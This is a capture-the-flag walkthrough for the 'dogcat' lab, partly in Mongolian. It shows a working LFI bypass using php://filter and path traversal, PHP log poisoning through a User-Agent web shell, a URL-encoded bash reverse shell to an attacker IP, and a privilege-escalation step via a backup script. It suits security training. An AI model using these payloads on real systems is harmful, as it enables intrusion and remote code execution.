# dogcat - Bypass LFI

## Flag 1

### Bypass LFI

```
http://10.82.186.195/?view=php://filter/convert.base64-encode/resource=dog/../index

or

http://10.82.186.195/?view=php://filter/convert.base64-encode/resource=dog/../flag
```

[image]

[image]

## Flag 2

Хэрэв бид index файлыг base64-өөр уншвал үүнд `&ext=id` гээд өөр параметр байхыг шаардаж байгааг мэдэх боломжтой.

```
http://10.82.186.195/?view=dog/../../../../var/log/apache2/access.log&ext=
```

```php
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
            echo 'Here you go!';
            include $_GET['view'] . $ext;
        } else {
            echo 'Sorry, only dogs or cats are allowed.';
        }
    }
?>
```

[image]

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

### Log Poisoning

```bash
curl -s 'http://10.82.186.195/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.161.252%2F1234%200%3E%261%22' -H @Poison
```

[image]

## Flag 4

```bash
echo 'bash reverse shell' > /opt/backup.sh
```
